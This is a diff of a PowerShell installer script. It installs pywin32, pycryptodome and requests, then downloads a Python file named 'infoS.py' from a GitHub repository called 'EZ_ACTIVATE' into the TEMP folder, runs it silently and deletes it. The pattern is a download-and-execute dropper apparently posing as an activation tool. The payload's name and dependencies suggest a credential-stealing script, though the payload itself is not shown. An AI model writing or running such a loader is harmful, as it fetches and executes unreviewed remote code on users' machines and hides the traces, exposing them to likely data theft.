@@ -1,23 +1,12 @@
-# Check if Python is installed
-$pythonPath = Get-Command python -ErrorAction SilentlyContinue
-if (-not $pythonPath) {
-    winget install --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
-    # Refresh environment
-    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine")
+if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
+    Write-Output "ERROR: Python is not installed. Download it from https://www.python.org/downloads/"
+    exit 1
 }
 
-# Ensure pip is available
-& python -m ensurepip --upgrade
+python -m pip install pywin32 pypiwin32 pycryptodome requests --quiet --disable-pip-version-check
 
-# Install required packages
-$requiredPackages = @("pywin32", "pycryptodome", "requests")
-foreach ($package in $requiredPackages) {
-    & python -m pip install $package --quiet --disable-pip-version-check --upgrade
-}
-
-# Download and run script
 $url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
-$tempFile = Join-Path $env:TEMP "infoS.py"
-Invoke-WebRequest -Uri $url -OutFile $tempFile
-& python $tempFile
+$tempFile = "$env:TEMP\infoS.py"
+Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
+python $tempFile
 Remove-Item $tempFile
